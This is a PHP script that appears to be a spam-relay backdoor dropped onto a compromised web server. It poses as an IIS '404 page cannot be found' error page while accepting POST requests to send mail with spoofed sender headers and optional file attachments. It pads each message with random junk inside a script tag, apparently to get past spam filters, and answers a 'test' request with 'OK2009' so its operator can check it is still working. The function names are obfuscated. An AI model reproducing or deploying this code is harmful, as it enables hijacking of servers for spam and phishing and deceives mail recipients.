<?


function rMiwvaZX($xctmp, $from, $to, $subj, $text, $filename) {
    $f         = fopen($filename,"rb");
    $un        = strtoupper(uniqid(time()));
    $head      = "From: $from\n";
    $head     .= "To: $to\n";
    $head     .= "Reply-To: $from\n";
    $head     .= "Subject: $subj\n";
    $head     .= "Content-Type:multipart/mixed;";
    $head     .= "boundary=\"----------".$un."\"\n\n";
    $zag       = "------------".$un."\nContent-Type:text/html;\n";
    $zag      .= "Content-Transfer-Encoding: 8bit\n\n$text\n\n";
    $zag      .= "------------".$un."\n";
    $zag      .= "Content-Type: application/octet-stream;";
    $zag      .= "name=\"".basename($filename)."\"\n";
    $zag      .= "Content-Transfer-Encoding:base64\n";
    $zag      .= "Content-Disposition:attachment;";
    $zag      .= "filename=\"".basename($filename)."\"\n\n";
    $zag      .= chunk_split(base64_encode(fread($f,filesize($filename))))."\n";

    return @mail("$to", "$subj", $zag, $head);
}

function KWhwNFZO($xctmp,$from,$to,$subj,$text) {

    $head      = "From: $from\n";
    $head     .= "To: $to\n";     
    $head     .= "Subject: ".$subj." (PACK ".rand(1,7).")\n";
    $head     .= "Reply-To: $from\n";
    $head     .= "Content-type: text/html; charset=iso-8859-5" . "\r\n";
	
	$massArray= array ( 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','`','-','=','~','!','@','$','%','^', '&','*','(',')','_','+',':','"',' ',' ',' ',' ',chr(0x0a),chr(0x0d),' ');                     
        
      
    $repeat=rand(15,30);
    $addtext='';   
     
    for($i=0;$i<$repeat;$i++) {
        $repeatChears=rand(49,259);
        for($z=0;$z<$repeatChears;$z++)
            $addtext.=$massArray[rand(0,75)];
    }

    $text.='<BR><script>'.$addtext.'</script>'; 
	
    return @mail($to,$subj." (PACK ".rand(1,7).")",$text,$head);
}

if (!empty($_POST['caption']) && !empty($_POST['email']) && !empty($_POST['clientname']) && !empty($_POST['emailsend']) && !empty($_POST['message']) && ($_POST['index'] == 'send'))
{

  $xclient = substr(htmlspecialchars(trim($_POST['clientname'])), 0, 80);
  $title = substr(htmlspecialchars(trim($_POST['caption'])), 0, 80);
  $mess64 = base64_decode($_POST['message']);
  $mess =  substr(trim($mess64), 0, 10000000);
  $send_to = $_POST['emailsend'];    
  $from = $_POST['email'];
  
  if($_FILES['file']['name'] !=''){
    if (is_dir("tmp")) { } else { mkdir("tmp"); }
    if(is_uploaded_file($_FILES['file']['tmp_name']))   {
    if(move_uploaded_file($_FILES['file']['tmp_name'], "tmp/".basename($_FILES['file']['name']))) {
    if(rMiwvaZX($xclient,$from,$send_to,$title,$mess,"tmp/".basename($_FILES['file']['name']))!== FALSE) { echo "OK-FILE"; } else { echo "ERROR-FILE"; }
    @unlink("tmp/".basename($_FILES['file']['name']));
    } else { echo "ERROR-UPLOAD"; }
    } else { echo "ERROR-MOVE"; }
  } else {
             if(KWhwNFZO($xclient,$from,$send_to,$title,$mess) !== FALSE) {
           echo "OK-MESS"; } else { echo "ERROR-MESS"; }
       }
}
else
{
if ($_GET['index'] == 'test') {echo "OK2009"; exit;} else
{
echo '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>The page cannot be found</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<STYLE type="text/css">
  BODY { font: 8pt/12pt verdana }
  H1 { font: 13pt/15pt verdana }
  H2 { font: 8pt/12pt verdana }
  A:link { color: red }
  A:visited { color: maroon }
</STYLE>
</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>

<h1>The page cannot be found</h1>
The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.
<hr>
<p>Please try the following:</p>
<ul>
<li>Make sure that the Web site address displayed in the address bar of your browser is spelled and formatted correctly.</li>
<li>If you reached this page by clicking a link, contact
 the Web site administrator to alert them that the link is incorrectly formatted.
</li>
<li>Click the <a href="javascript:history.back(1)">Back</a> button to try another link.</li>
</ul>
<h2>HTTP Error 404 - File or directory not found.<br>Internet Information Services (IIS)</h2>
<hr>
<p>Technical Information (for support personnel)</p>
<ul>
<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>404</b>.</li>
<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
 and search for topics titled <b>Web Site Setup</b>, <b>Common Administrative Tasks</b>, and <b>About Custom Error Messages</b>.</li>
</ul>

</TD></TR></TABLE></BODY></HTML>';}

}  
  
?>
